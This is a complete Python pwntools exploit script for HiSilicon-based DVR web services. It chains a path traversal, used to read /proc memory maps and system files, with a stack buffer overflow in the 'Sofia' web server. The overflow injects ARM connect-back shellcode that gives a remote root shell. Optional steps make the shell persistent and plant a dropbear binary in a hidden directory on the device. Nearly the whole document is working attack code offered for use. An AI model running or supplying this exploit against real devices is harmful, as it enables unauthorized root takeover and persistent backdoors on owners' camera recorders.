#!/usr/bin/env python2
#
# pwn hisilicon dvr web service
#

from pwn import *
from time import sleep
import re
import argparse
import os
context.log_level = 'DEBUG'

parser = argparse.ArgumentParser(description='exploit HiSilicon DVR devices')
parser.add_argument('--rhost', help='target host', required=True)
parser.add_argument('--rport', help='target port', default=80)
parser.add_argument('--lhost', help='connectback ip', required=True)
parser.add_argument('--lport', help='connectback port', default=31337)
parser.add_argument('--bhost', help='listen ip to bind (default: connectback)')
parser.add_argument('--bport', help='listen port to bind (default: connectback)')
parser.add_argument('-n', '--nolisten', help='do not start listener (you should care about connectback listener on your own)', action='store_true')
parser.add_argument('-i', '--interactive', help='select stack memory region interactively (rather than using autodetection)', action='store_true')
parser.add_argument('-p', '--persistent', help='make connectback shell persistent by restarting dvr app automatically (DANGEROUS!)', action='store_true')
parser.add_argument('-u', '--upload', help='upload tools (now hardcoded "./tools/dropbear" in script) after pwn', action='store_true')
parser.add_argument('--offset', help='exploit param stack offset to mem page base (default: 0x7fd3d8)', default=0x7fd3d8)
parser.add_argument('--cmdline', help='cmdline of Sofia binary on remote target (default "/var/Sofia")', default=b'/var/Sofia')

args = parser.parse_args()

target_host = args.rhost
target_port = int(args.rport)

sofia_cmdline = args.cmdline

if args.interactive:
    getleak_interactive = True
else:
    getleak_interactive = False

if args.persistent:
    shell_persistent = True
else:
    shell_persistent = False

if args.upload:
    shell_upload = True
else:
    shell_upload = False
    
connectback_host = args.lhost
connectback_port = int(args.lport)

if args.bhost:
    listen_host = args.bhost
else:
    listen_host = connectback_host
if args.bport:
    listen_port = int(args.bport)
else:
    listen_port = connectback_port


"""
vuln1: bof in httpd
-------------------
buffer overflow in builtin webserver binary `Sofia`
which can be exploited to run shellcode (as root) on the device.

PoC payload to cause a segfault:
payload = "GET " + "a"*299 + "xxxx" + " HTTP"

note, that in "xxxx" we can control pc register (program flow)!

there is no nx enabled, so executing shellcode in place of "a"*299
is possible. however, stack address leak is needed to defeat aslr.

vuln2: path traversal vuln in httpd
-----------------------------------
builtin webserver has a directory path traversal vulnerability
which can be exploited to leak arbitrary files.
note, that the webserver binary `Sofia` is running as root,
so exploiting this arbitrary file can be read from device fs.

PoC request "GET ../../etc/passwd HTTP" reads file "/etc/passwd".
Furthermore, dir listing is enabled as well.

by exploiting vuln2 we can defeat aslr needed to exploit vuln1.
namely, filesystem at /proc contains lots of information
about running processes, e.g. contains memory mappings:
request "GET ../../proc/[pid]/maps HTTP" reads memory
mapping of process with pid [pid]. obverving the memory
mapping patterns usually enough to defeat aslr (offset
from mem map base is the same, even in different versions).
"""

# get pid of running dvr binary '/var/Sofia'
def findpid():
    with log.progress('getting pidlist') as logp:
        c = context.log_level
        context.log_level = 'error'
        r = remote(target_host, target_port)
        r.sendline('GET ../../proc HTTP')
        pids = []
        for line in r.recvall().splitlines():
            res = re.match(r'.*\.\./\.\./proc/([0-9]+)"', line.decode())
            if res:
                pids.append(int(res.group(1)))
        r.close()
        context.log_level = c
        logp.success('found %d processes' % len(pids))
        print(list(pids))
    with log.progress("searching for PID of '%s'" % sofia_cmdline) as logp:
        pid_sofia = None
        pids.sort(reverse=True)
        for pid in pids:
            logp.status(str(pid))
            c = context.log_level
            context.log_level = 'error'
            r = remote(target_host, target_port)
            r.sendline(b'GET ../../proc/%d/cmdline HTTP' % pid)
            
            resp = r.recvall().splitlines()
            r.close()
            context.log_level = c
            if sofia_cmdline + b'\x00' == resp[-1]:
                pid_sofia = pid
                logp.success(str(pid_sofia))
                break
        if not pid_sofia:
            logp.failure('did not found')

    return pid_sofia

def getmodelnumber():
    c = context.log_level
    context.log_level = 'error'
    r = remote(target_host, target_port)
    r.sendline('GET ../../mnt/custom/ProductDefinition HTTP')
    for l in r.recvall(timeout=5).decode('ascii').replace(',', '\n').splitlines():
        if "Hardware" in l:
            modelnumber = l.split(":")[1].split('"')[1]
    r.close()
    context.log_level = c
    return modelnumber

def guessregion(smaps):
    for t in range(len(smaps)-7, 1, -1):
        if (smaps[t][1][0], smaps[t+1][1][0], smaps[t+2][1][0], smaps[t+3][1][0], smaps[t+4][1][0], smaps[t+5][1][0], smaps[t+6][1][0]) == (8188, 8188, 8188, 8188, 8188, 8188, 8188) and smaps[t][1][1] == 4 and smaps[t+1][1][1] == 4 and smaps[t+2][1][1] == 4 and smaps[t+3][1][1] >= 8 and smaps[t+4][1][1] >= 4 and smaps[t+5][1][1] >= 4 and smaps[t+6][1][1] >= 8:
            return (t+3)
    return (-1)

# getting stack section base address
# 'k' defines the section which contains the stack
def getleak(pid, interactive):
    with log.progress("getting stack section base") as logp:
        c = context.log_level
        context.log_level = 'error'
        r = remote(target_host, target_port)
        r.sendline('GET ../../proc/%d/smaps HTTP' % pid)
        smaps = []
        memStart = False
        for line in r.recvall().splitlines():
            if memStart:
                t += (int(line.split()[1]),)
                i += 1
                #if i >= 14:
                if i >= 7:
                    smaps.append((memStart, t))
                    memStart = False
            if b'rwxp' in line:
                memStart = int(line.split('-')[0], 16)
                i = 0
                t = ()
        guess = guessregion(smaps)
        if guess < 0 or interactive:
            j = 0
            for i in smaps:
                print (j, hex(i[0]), i[1:])
                j += 1
            k = int(raw_input('enter stack region id (guessed value = %d): ' % guess))
        else:
            k = guess
        leak = smaps[k][0]
        r.close()
        context.log_level = c
        logp.success(hex(leak))
    return leak

# connectback shellcode
# badchars: 0x00, 0x0d, 0x20, 0x3f, 0x26
def shellcode(lhost, lport):
    badchars = [b'\x00', b'\x0d', b'\x20', b'\x3f', b'\x26']
    #badchars = map(chr, badchars)

    xscode  = "01108fe211ff"
    xscode += "2fe111a18a78013a8a700221081c0121921a0f02193701df061c0ba10223"
    xscode += "0b801022023701df3e270137c821301c01df0139fbd507a0921ac27105b4"
    xscode += "69460b2701df0121081c01dfc046ffff7a69c0a858642f62696e2f736858"
    xscode += "ffffc046efbeadde"
    
    h = lambda x: hex(int(x))[2:]
    h2 = lambda x: h(x).zfill(2)
    xscode = xscode[:164] + h(lport+0x100).zfill(4) + ''.join(map(h2, lhost.split('.'))) + xscode[176:]
    xscode = bytes.fromhex(xscode)
    for badchar in badchars:
        if badchar in xscode:
            raise NameError('badchar %s in shellcode!' % hex(ord(badchar)))
    return xscode

def restart_dvrapp(c):
    with log.progress('restarting dvr application') as logp:
        logp.status('looking up dvrhelper process')
        c.sendline('ps')
        cmdline = ''
        while not 'dvrHelper' in cmdline:
            cmdline = c.recvline()
        cmdline = cmdline.split()
        while not 'ps' in c.recvline():
            pass
        sleep(1)
        logp.status('killing dvrhelper')
        c.sendline('kill %s' % cmdline[0])
        sleep(1)
        cmdline_dvrhelper = ' '.join(cmdline[4:])
        logp.status('starting dvrhelper: %s' % cmdline_dvrhelper)
        c.sendline(cmdline_dvrhelper + ' 2>/dev/null &')
        sleep(1)
        c.recvuntil(sofia_cmdline)
        c.recvline()

def upload_tools(c):
    with log.progress('uploading tools to /var/.tools') as logp:
        logp.status('creating dir')
        c.sendline('rm -fr /var/.tools')
        sleep(1)
        c.sendline('mkdir /var/.tools')
        sleep(1)
        tools = ['dropbear']
        upload_blocksize = 1024
        for tool in tools:
            toolsize = os.path.getsize('./tools/%s' % tool)
            b = 0
            fp = open("./tools/%s" % tool, "rb")
            for chunk in iter(lambda: fp.read(upload_blocksize), ''):
                chunkhex = ''.join(['\\x'+chunk.encode('hex')[i:i+2].zfill(2) for i in range(0, len(chunk)*2, 2)])
                c.sendline("echo -n -e '%s' >> /var/.tools/%s" % (chunkhex, tool))
                b += len(chunk)
                logp.status('%s: %d/%d' % (tool, b, toolsize))
                sleep(0.1)
            fp.close()
            c.sendline('chmod +x /var/.tools/%s' % tool)
            sleep(1)
        logp.success(' '.join(tools))
        
log.info('target is %s:%d' % (target_host, target_port))

if not args.nolisten:
    log.info('connectback on %s:%d' % (listen_host, listen_port))

with log.progress("assembling shellcode") as logp:
    xscode = shellcode(connectback_host, connectback_port)
    logp.success("done. length is %d bytes" % len(xscode))

with log.progress("identifying model number") as logp:
    modelnumber = getmodelnumber()
    logp.success(modelnumber)
    
log.info('exploiting dir path traversal of web service to get leak addresses')
stack_section_base = getleak(findpid(), getleak_interactive)
stack_offset = args.offset
stack_20 = stack_section_base + stack_offset + 20

log.info('shellcode address is ' + hex(stack_20))

payload  = "GET "
payload += xscode
payload += "a" * (299 - len(xscode))
payload += p32(stack_20)
payload += " HTTP"

log.info('exploiting buffer overflow in web service url path')
log.info('remote shell should gained by connectback shellcode!')

if not args.nolisten:
    l = listen(bindaddr=listen_host, port=listen_port, timeout=5)
    c = l.wait_for_connection()

r = remote(target_host, target_port)
r.sendline(payload)
r.recvall(timeout=5)
r.close()

if not args.nolisten:
    if shell_persistent:
        restart_dvrapp(c)

    if shell_upload:
        upload_tools(c)
    
    c.interactive()